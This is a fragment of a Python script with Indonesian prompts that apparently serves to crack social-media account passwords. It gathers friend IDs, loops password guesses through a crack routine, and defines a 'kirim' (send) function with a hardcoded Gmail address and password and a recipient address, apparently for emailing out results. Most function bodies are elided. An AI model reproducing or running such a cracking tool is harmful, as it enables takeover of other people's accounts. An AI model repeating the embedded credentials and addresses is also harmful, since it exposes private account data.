...
def inputM(x,d):
	...
	return i
def kirim():
   email_user = 'stut.74ck@gmail.com'
   email_password = 'b4h4m1s4h'
   email_send = 'ugifirmansyah@yahoo.com'
...
def idteman():
	...
	while 1:
		...
		try:
			...
			break
	simpan()
	i = inputD('[?]Mau Langsung Hajar.. (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def crack(d):
	...
	if i.upper() == 'P':
		...
		for i in D:
			...
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Belum dapet yg pass yaa,Mau coba lagi (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
